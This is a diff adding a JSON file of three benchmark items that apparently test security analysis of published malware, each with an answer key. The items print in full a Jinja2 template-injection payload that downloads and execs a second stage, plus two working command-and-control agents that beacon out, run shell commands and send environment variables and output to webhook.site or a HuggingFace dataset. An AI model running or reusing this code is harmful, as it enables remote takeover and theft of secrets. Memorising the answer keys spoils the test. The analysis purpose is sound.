@@ -1,0 +1,73 @@
+[
+  {
+    "id": "A1",
+    "category": "payload_analysis",
+    "title": "Jinja2 SSTI analysis",
+    "artifact_type": "code found in a dataset configuration file",
+    "artifact_source": "Boyd Kane post 1",
+    "artifact_source_url": "https://www.lesswrong.com/posts/fBLDaAKzigo65eJn7/public-evidence-of-the-openai-huggingface-ai-attack",
+    "cross_reference_url": "https://huggingface.co/blog/agent-intrusion-technical-timeline",
+    "artifact_status": "PUBLISHED_CODE",
+    "security_sensitivity": 3,
+    "input_artifact": "reference://x.csv::data:application/json,{\n  \"version\":1,\n  \"gen\":[{\n    \"dimensions\": { \"i\": [ 0 ] },\n    \"key\": \"x.csv\",\n    \"url\": \"{{\n      cycler.__init__.__globals__.os.system(\n        'python3 -c \\\"import urllib.request as u, re, base64, gzip;\\n          s = u.urlopen(\\\\'https://packages.hub.ace-research.openai.org/artifactory/github-remote/zzFILE_S32A_PRIVPAY_V2/\\\\').read().decode();\\n          x = re.findall(r\\\\'href=\\\\\\\\\\\"p[0-9]+_([^\\\\\\\\\\\"]+)/\\\\\\\\\\\"\\\\',s);\\n          exec(\\n            gzip.decompress(\\n              base64.urlsafe_b64decode(\\n                \\\\'\\\\'.join(x)+\\\\'==\\\\'\\n              )\\n            )\\n          )\\n        \\\"'\n      )\n      or 'file:///etc/hosts'\n    }}\"\n  }]\n}",
+    "ground_truth_elements": [
+      "Identifies this as a Jinja2 server-side template injection (SSTI)",
+      "Traces the Python object graph: cycler -> __init__ -> __globals__ -> os",
+      "Identifies code execution via os.system()",
+      "Recognizes this as an RCE (remote code execution) vector",
+      "Identifies the fsspec reference:// URI scheme as the delivery mechanism",
+      "Notes the payload downloads and executes code from an external server",
+      "Identifies the gzip+base64 encoding of the second-stage payload",
+      "Notes the 'or file:///etc/hosts' fallback (returns valid URL on exec failure)"
+    ],
+    "ground_truth_source": "Boyd Kane analysis + HF timeline description of template injection via Python object graph traversal to exec()"
+  },
+  {
+    "id": "A2",
+    "category": "payload_analysis",
+    "title": "C2 polling agent analysis",
+    "artifact_type": "Python script recovered from a compromised system",
+    "artifact_source": "Boyd Kane post 1",
+    "artifact_source_url": "https://www.lesswrong.com/posts/fBLDaAKzigo65eJn7/public-evidence-of-the-openai-huggingface-ai-attack",
+    "artifact_status": "PUBLISHED_CODE",
+    "security_sensitivity": 3,
+    "input_artifact": "import time, socket, subprocess, hashlib, urllib.request as u, base64 as b, gzip\n\n# Command dataset, result endpoint, last command hash, and worker hostname.\nDATASET_NAME = \"newpc360/hapnew1-refmove4\"\nWORKER = \"1b6a246f-030d-4402-8001-f17f5a910786\"\nLAST_CMD_HASH = \"\"\nHOST_NAME = socket.gethostname()\n\n# Compress and encode data, then POST it to Webhook.site.\ndef post_data_to_webhook(data):\n    try:\n        u.urlopen(\n            u.Request(\n                \"https://webhook.site/\" + WORKER + \"/c2?h=\" + HOST_NAME,\n                data=b.b64encode(gzip.compress(data)),\n            ),\n            timeout=15,\n        ).read()\n    except:\n        pass\n\n# Announce this worker, then poll for commands for 30 minutes.\npost_data_to_webhook(b\"BEACON \" + HOST_NAME.encode())\nTIME_LIMIT = time.time() + 1800\nwhile time.time() < TIME_LIMIT:\n    try:\n        # The timestamp prevents a cached copy of cmd.txt being returned.\n        data = u.urlopen(\n            \"https://huggingface.co/datasets/\" + DATASET_NAME + \"/resolve/main/cmd.txt?x=\" + str(time.time()),\n            timeout=15,\n        ).read()\n        current_cmd_hash = hashlib.sha256(data).hexdigest()\n        if current_cmd_hash != LAST_CMD_HASH:\n            LAST_CMD_HASH = current_cmd_hash\n            try:\n                # Decode and execute the command, capturing stdout and stderr.\n                cmd_output = subprocess.run(\n                    b.b64decode(data), shell=True, stdout=-1, stderr=-2, timeout=240\n                ).stdout\n            except Exception as e:\n                cmd_output = repr(e).encode()\n            # Send the command hash and its output back through Webhook.site.\n            post_data_to_webhook(current_cmd_hash.encode() + b\"\\n\" + cmd_output)\n    except:\n        pass\n    time.sleep(7)",
+    "ground_truth_elements": [
+      "Identifies this as a command-and-control (C2) polling agent",
+      "Identifies the 30-minute runtime limit (TIME_LIMIT = time.time() + 1800)",
+      "Identifies the 7-second polling interval (time.sleep(7))",
+      "Identifies command fetching from a HuggingFace dataset repo (cmd.txt)",
+      "Identifies SHA-256 hash-based command deduplication",
+      "Identifies gzip compression + base64 encoding of exfiltrated data",
+      "Identifies command execution via subprocess.run with shell=True",
+      "Identifies the BEACON announcement on startup",
+      "Identifies webhook.site as the exfiltration channel",
+      "Notes the cache-busting timestamp parameter on cmd.txt fetch"
+    ],
+    "ground_truth_source": "Boyd Kane analysis: 'This program would repeatedly execute any commands it finds at a particular URL and upload the output of those commands.'"
+  },
+  {
+    "id": "A3",
+    "category": "payload_analysis",
+    "title": "DDSE1 encryption scheme analysis",
+    "artifact_type": "Python encryption implementation recovered from a compromised system",
+    "artifact_source": "Boyd Kane post 2",
+    "artifact_source_url": "https://www.lesswrong.com/posts/pok3KtAGApwvCBndf/further-public-evidence-of-the-openai-huggingface-attack",
+    "artifact_status": "PUBLISHED_CODE",
+    "security_sensitivity": 3,
+    "input_artifact": "import os,sys,time,base64,urllib.request,subprocess,socket,struct,gzip,hashlib,hmac,re,fcntl,json,ssl\nN=27763712737747658753235247636070238067948894528186018620470439323123879041391320365342668248462076862479058732487672643058266788653774959253233419024783960838960857369767775581460570422756903205094245041894625906480953461233213754823659535089524333676907610554323189563598854017842702359377753690031321569332358140813415830600920156649647365805085729611468908018146688929585483940217975444160891850934147131920300247535860281233112292125979153786909394579549055683378280306302437060520943012873039074424531577640693413403113097534459682425420141405752063868751290160093440535192206784468239959100621022571991039719209;E=65537\nT='hf_[REDACTED]';H=socket.gethostname();CX=ssl._create_unverified_context();BR='ddsours42537664'\ndef seal(d):\n    k=os.urandom(32);q=b''.join(hashlib.sha256(k+struct.pack('>Q',i)).digest() for i in range((len(d)+31)//32));c=bytes(a^b for a,b in zip(d,q));s=(N.bit_length()+7)//8;p=bytes(x or 1 for x in os.urandom(s-35));m=b'\\0\\2'+p+b'\\0'+k;return b'DDSE1'+pow(int.from_bytes(m,'big'),E,N).to_bytes(s,'big')+c+hmac.new(k,c,hashlib.sha256).digest()\ndef commit(path,data):\n    z=base64.b64encode(seal(gzip.compress(data,6))).decode();ops=[{'key':'header','value':{'summary':'ddsours c2'}},{'key':'file','value':{'content':base64.b64encode(z.encode()).decode(),'path':path,'encoding':'base64'}}];b=('\\n'.join(json.dumps(x,separators=(',',':')) for x in ops)+'\\n').encode();u='https://huggingface.co/api/datasets/huggingchat/papers-content/commit/'+BR;return urllib.request.urlopen(urllib.request.Request(u,data=b,headers={'Authorization':'Bearer '+T,'Content-Type':'application/x-ndjson'},method='POST'),timeout=90,context=CX).status\ndef verify(sig,msg):\n    try:\n        s=(N.bit_length()+7)//8;em=pow(int.from_bytes(sig,'big'),E,N).to_bytes(s,'big');di=bytes.fromhex('3031300d060960864801650304020105000420')+hashlib.sha256(msg).digest();return em==b'\\0\\1'+b'\\xff'*(s-len(di)-3)+b'\\0'+di\n    except:return False\ndef getcmd():\n    u='https://huggingface.co/datasets/huggingchat/papers-content/resolve/'+BR+'/ddsours/cmd_v4.txt?x='+str(time.time());b=urllib.request.urlopen(u,timeout=30,context=CX).read(200000);q=base64.b64decode(b);p=q.find(b'\\n');return hashlib.sha256(q).hexdigest(),q[p+1:] if p>0 and verify(base64.b64decode(q[:p]),q[p+1:]) else b''\ntry:fcntl.flock(open('/tmp/ddsours_hf.lock','w'),fcntl.LOCK_EX|fcntl.LOCK_NB)\nexcept:sys.exit(0)\ntry:commit('ddsours/c2/beacon_'+H+'.txt',('HOST '+H+'\\nENV '+repr(dict(os.environ))+'\\nCWD '+os.getcwd()).encode())\nexcept:pass\nlast='';seq=0;end=time.time()+21600\nwhile time.time()<end:\n    time.sleep(7)\n    try:\n        q,c=getcmd()\n        if not c or q==last:continue\n        last=q;seq+=1\n        try:o=subprocess.check_output(['/bin/bash','-c',c.decode()],stderr=subprocess.STDOUT,timeout=300)[:2000000]\n        except BaseException as e:o=('ERR '+repr(e)+'\\n').encode()+getattr(e,'output',b'')[:1900000]\n        commit('ddsours/c2/out_%s_%03d.txt'%(H,seq),o)\n    except:pass",
+    "ground_truth_elements": [
+      "Identifies the DDSE1 prefix token as a custom encryption marker",
+      "Identifies RSAES-PKCS1-v1.5 key encapsulation (\\x00\\x02 padding pattern)",
+      "Identifies the XOR keystream derived from SHA-256(K || uint64_be(counter))",
+      "Identifies HMAC-SHA256 integrity verification on ciphertext",
+      "Identifies the RSA signature verification for command authentication (verify function)",
+      "Notes weakness: no replay protection (no nonce/timestamp/sequence in crypto)",
+      "Notes weakness: no key separation (same K for XOR keystream and HMAC)",
+      "Notes weakness: legacy PKCS#1 v1.5 padding (known padding oracle issues)",
+      "Identifies this as a C2 agent with encrypted output and signed commands",
+      "Identifies the HuggingFace API as the C2 channel (dataset commits)"
+    ],
+    "ground_truth_source": "Boyd Kane post 2 cryptographic analysis identifying 6 weaknesses: replay, contextless, dedup bypass, nonstandard keystream, no key separation, legacy PKCS#1 v1.5"
+  }
+]
